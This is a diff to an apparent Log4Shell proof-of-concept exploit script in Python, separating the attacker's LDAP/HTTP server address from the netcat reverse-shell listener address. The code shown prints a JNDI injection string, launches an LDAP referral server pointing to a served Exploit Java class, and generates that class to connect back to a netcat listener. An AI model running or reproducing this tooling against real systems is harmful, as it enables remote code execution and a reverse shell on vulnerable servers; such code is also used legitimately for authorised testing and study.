@@ -11,7 +11,7 @@ from http.server import HTTPServer, SimpleHTTPRequestHandler
 CUR_FOLDER = Path(__file__).parent.resolve()
 
 
-def generate_payload(userip: str, lport: int) -> None:
+def generate_payload(ncip: str, ncport: int) -> None:
     program = """
 import java.io.IOException;
 import java.io.InputStream;
@@ -51,7 +51,7 @@ public class Exploit {
         s.close();
     }
 }
-""" % (userip, lport)
+""" % (ncip, ncport)
 
     # writing the exploit to Exploit.java file
 
@@ -67,13 +67,13 @@ public class Exploit {
         print(Fore.GREEN + '[+] Exploit java class created success')
 
 
-def payload(userip: str, webport: int, lport: int) -> None:
-    generate_payload(userip, lport)
+def payload(serversip: str, ncip: str, webport: int, ncport: int) -> None:
+    generate_payload(ncip, ncport)
 
     print(Fore.GREEN + '[+] Setting up LDAP server\n')
 
     # create the LDAP server on new thread
-    t1 = threading.Thread(target=ldap_server, args=(userip, webport))
+    t1 = threading.Thread(target=ldap_server, args=(serversip, webport))
     t1.start()
 
     # start the web server
@@ -90,11 +90,11 @@ def check_java() -> bool:
     return exit_code == 0
 
 
-def ldap_server(userip: str, lport: int) -> None:
-    sendme = "${jndi:ldap://%s:1389/a}" % (userip)
+def ldap_server(serversip: str, webport: int) -> None:
+    sendme = "${jndi:ldap://%s:1389/a}" % (serversip)
     print(Fore.GREEN + f"[+] Send me: {sendme}\n")
 
-    url = "http://{}:{}/#Exploit".format(userip, lport)
+    url = "http://{}:{}/#Exploit".format(serversip, webport)
     subprocess.run([
         os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/java"),
         "-cp",
@@ -112,18 +112,23 @@ def main() -> None:
 """)
 
     parser = argparse.ArgumentParser(description='log4shell PoC')
-    parser.add_argument('--userip',
-                        metavar='userip',
+    parser.add_argument('--serversip',
+                        metavar='serversip',
                         type=str,
                         default='localhost',
-                        help='Enter IP for LDAPRefServer & Shell')
+                        help='Enter IP for LDAPRefServer and HTTP servers')
     parser.add_argument('--webport',
                         metavar='webport',
                         type=int,
                         default='8000',
                         help='listener port for HTTP port')
-    parser.add_argument('--lport',
-                        metavar='lport',
+    parser.add_argument('--ncip',
+                        metavar='ncip',
+                        type=str,
+                        default='localhost',
+                        help='Netcat IP')
+    parser.add_argument('--ncport',
+                        metavar='ncport',
                         type=int,
                         default='9001',
                         help='Netcat Port')
@@ -134,7 +139,7 @@ def main() -> None:
         if not check_java():
             print(Fore.RED + '[-] Java is not installed inside the repository')
             raise SystemExit(1)
-        payload(args.userip, args.webport, args.lport)
+        payload(args.serversip, args.ncip, args.webport, args.ncport)
     except KeyboardInterrupt:
         print(Fore.RED + "user interrupted the program.")
         raise SystemExit(0)
